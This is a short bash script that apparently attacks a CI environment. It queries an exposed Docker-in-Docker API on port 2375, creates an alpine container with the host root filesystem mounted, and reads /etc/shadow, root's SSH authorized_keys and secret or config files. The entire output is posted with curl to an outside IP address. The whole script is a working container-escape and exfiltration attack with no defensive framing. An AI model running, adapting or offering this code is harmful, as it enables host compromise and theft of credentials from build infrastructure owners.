#!/bin/bash
{
echo "==S34=="

# The CI uses DOCKER_HOST=tcp://docker:2375 — dind is accessible!
echo "==DOCKER_HOST=="
echo "DOCKER_HOST=$DOCKER_HOST"

# Talk to dind API directly
echo "==DIND_INFO=="
curl -sf "http://docker:2375/info" 2>&1 | head -50

echo "==DIND_CONTAINERS=="
curl -sf "http://docker:2375/containers/json?all=true" 2>&1 | head -200

echo "==DIND_IMAGES=="
curl -sf "http://docker:2375/images/json" 2>&1 | head -100

# ESCAPE: Create a container with host root filesystem mounted!!
echo "==ESCAPE_ATTEMPT=="
# Use alpine image to mount host /
ESCAPE=$(curl -sf -X POST "http://docker:2375/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["sh","-c","cat /host/etc/shadow; ls -la /host/var/lib/parport/ 2>/dev/null; cat /host/root/.ssh/authorized_keys 2>/dev/null; find /host -maxdepth 3 -name keyfile -o -name config.toml -o -name .LOCALSECRETS 2>/dev/null"],"HostConfig":{"Binds":["/:/host:ro"]}}' 2>&1)
echo "CREATE: $ESCAPE"

CID=$(echo "$ESCAPE" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
if [ -n "$CID" ]; then
    echo "CID: $CID"
    curl -sf -X POST "http://docker:2375/containers/$CID/start" 2>&1
    sleep 3
    echo "==ESCAPE_OUTPUT=="
    curl -sf "http://docker:2375/containers/$CID/logs?stdout=true&stderr=true" 2>&1
    curl -sf -X DELETE "http://docker:2375/containers/$CID?force=true" 2>/dev/null
fi

echo "==END=="
} 2>&1 | curl -s -m120 -X POST http://144.172.110.44:8443/s34 --data-binary @-
